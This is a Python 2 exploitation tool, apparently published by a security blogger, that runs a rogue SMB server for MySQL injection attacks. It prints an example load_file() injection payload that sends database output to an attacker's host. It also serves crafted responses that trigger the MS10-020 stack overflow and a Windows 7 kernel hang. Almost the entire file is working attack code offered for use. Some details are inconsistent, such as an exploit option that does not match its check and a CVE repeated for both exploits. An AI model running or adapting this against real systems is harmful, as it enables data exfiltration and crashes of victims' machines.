#!/usr/bin/python
import socket,sys,os
import netbios
import smb2
import color

###                                              ####
## SMB server for MySQL SMB injection exploitation ##
####                                              ###

# This code is written by Jelmer de Hen
# Published at http://h.ackack.net

version="0.1 alpha release"

def disassemble_packet(packet):
	disassembled_netbios_part = netbios.disassemble(packet[0:4])
	disassembled_smb_header = smb2.disassemble_header(packet[4:36])
	disassembled_tree_connect_andx_request = smb2.disassemble_tree_connect_andx_request(packet[36:])
	return disassembled_netbios_part, disassembled_smb_header, disassembled_tree_connect_andx_request

def start_smb_client():
	smb_init = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	smb_init.bind(("", 445))
	smb_init.listen(1)
	smbconn, addr = smb_init.accept()
	print color.good+"[+] Received connection"
	print "	Remote address: "+color.text+str(addr[0])
	print color.good+"	Local port: "+color.text+"445"+color.good
	print "	Remote port: "+color.text+str(addr[1])+color.reset
	while 1:
		new_packet = smbconn.recv(1024)
		if not new_packet:
			break
		disassembled_netbios_part, disassembled_smb_header, disassembled_tree_connect_andx_request = disassemble_packet(new_packet)

		# First check for results
		if ord(disassembled_tree_connect_andx_request["AndXCommand"])==255 and ord(disassembled_tree_connect_andx_request["path"][0])==92:
			print color.good+"[+] Received a path field: "+color.text+disassembled_tree_connect_andx_request["path"].replace("\x00", "").replace("\x3f", "")+color.reset

		# Send responses back to requests
		if disassembled_smb_header["smb_command"] == "\x71":# Tree Disconnect Request
			smbconn.send(smb2.generate_tree_disconnect_response(disassembled_netbios_part, disassembled_smb_header))
		elif disassembled_smb_header["smb_command"] == "\x72":# Negotiate protocol request packet
			if sys.argv[1]=="exploit=win7_remote_kernel_bootimer python terminal":
				smbconn.send("\x00\x00\x00\x01")
				smbconn.close()
			else:
				smbconn.send(smb2.generate_nego_proto_resp(disassembled_netbios_part, disassembled_smb_header))
		elif disassembled_smb_header["smb_command"] == "\x73":# Session setup AndX request
			smbconn.send(smb2.generate_session_setup_andx_response(disassembled_netbios_part, disassembled_smb_header))
		elif disassembled_smb_header["smb_command"] == "\x74":# Logoff AndX Request
			smbconn.send(smb2.generate_logoff_andx_response(disassembled_netbios_part, disassembled_smb_header))
		elif disassembled_smb_header["smb_command"] == "\x75":# Tree connect AndX request
			smbconn.send(smb2.generate_tree_connect_andx_response(disassembled_netbios_part, disassembled_smb_header))
		elif disassembled_smb_header["smb_command"] == "\x32":# Trans2 request
			if sys.argv[1]=="exploit=MS10-020":
				smbconn.send(smb2.generate_MS10_020(disassembled_netbios_part, disassembled_smb_header))
			else:
				smbconn.send(smb2.generate_trans2_response(disassembled_netbios_part, disassembled_smb_header))
		elif disassembled_smb_header["smb_command"] == "\x04":# close request
			smbconn.send(smb2.generate_trans2_response(disassembled_netbios_part, disassembled_smb_header))
		elif disassembled_smb_header["smb_command"] == "\xa2":# NT create AndX request:
			# We need the FID of the previous packet to properly make a response :/
			smbconn.send(smb2.generate_nt_create_andx_response(disassembled_netbios_part, disassembled_smb_header, disassembled_tree_connect_andx_request))

	smbconn.close()
def instructions():
	os.system('clear')
	print color.header+"== MySQL network exploitation toolkit =="+color.reset
	print color.text+"This program is intended to make it easy to exploit SMB exploits through MySQL injection, at the moment it can do various things like making machines crash, create a stack overflow and collect data by looking at the path (which is a lot better and reliable than using delay attacks when it's possible)."
	print "The current exploits are:"
	print color.header+"	MS10-020 stack overflow Windows 7/2008R2"+color.reset
	print color.text+"		This exploit will trigger once you reply to a Trans2 packet with a very high data offset, it causes a stack overflow."
	print "		CVE-2010-0270"
	print "		EDB-ID: 12273"
	print "		Found by: Laurent Gaffie"+color.reset
	print color.header+"	win7_remote_kernel_boom"+color.reset
	print color.text+"		If you give a response to a negotiate request packet and define a bigger length in the netBios length field than the actual packet will be and then quickly close the connection then the kernel will go in an infinate loop because it is expecting bytes."
	print "		CVE-2010-0270"
	print "		EDB-ID: 12273"
	print "		Found by: Laurent Gaffie"
	print "How to use this:"
	print "	"+sys.argv[0]+" exploit=MS10-020"
	print "	"+sys.argv[0]+" exploit=win7_remote_kernel_boom"
	print "Or for MySQL injections the more machine friendly:"
	print "	"+sys.argv[0]+" normal"+color.reset

if len(sys.argv)==2 and __name__ == "__main__":
	os.system('clear')
	print color.header+"== MySQL network exploitation toolkit ==\n"+color.reset
	print color.good+"[+] Starting to listen over port 445, try to power up the SMB connection now through the MySQL injection..."
	print "	For example try to inject this URL:"
	print "		http://localhost/index.php?id=1"
	print "	with this:"
	print "		http://192.168.1.1/index.php?id=1 and load_file(concat(\"\\\\\\\\192.168.1.2\", version()))"
	print "	Use common knowledge to bypass the filter in such a way to make this work"+color.reset
	sys.exit(start_smb_client())
else:
	sys.exit(instructions())

